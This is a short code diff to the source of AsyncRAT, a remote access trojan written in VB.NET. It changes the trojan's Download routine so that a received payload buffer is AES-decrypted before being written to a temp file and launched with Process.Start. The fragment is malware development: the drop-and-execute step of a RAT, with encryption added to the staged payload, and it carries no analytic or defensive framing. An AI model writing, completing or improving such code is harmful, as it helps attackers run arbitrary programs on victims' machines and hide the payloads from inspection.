@@ -357,7 +357,7 @@ Namespace AsyncRAT
         Private Shared Sub Download(ByVal Name As String, ByVal Buffer As Byte(), ByRef Update As Boolean)
             Try
                 Dim Temp As String = Path.GetTempFileName + Name
-                File.WriteAllBytes(Temp, Buffer)
+                File.WriteAllBytes(Temp, AES_Decryptor(Buffer))
                 Thread.Sleep(500)
                 Process.Start(Temp)
                 If Update Then
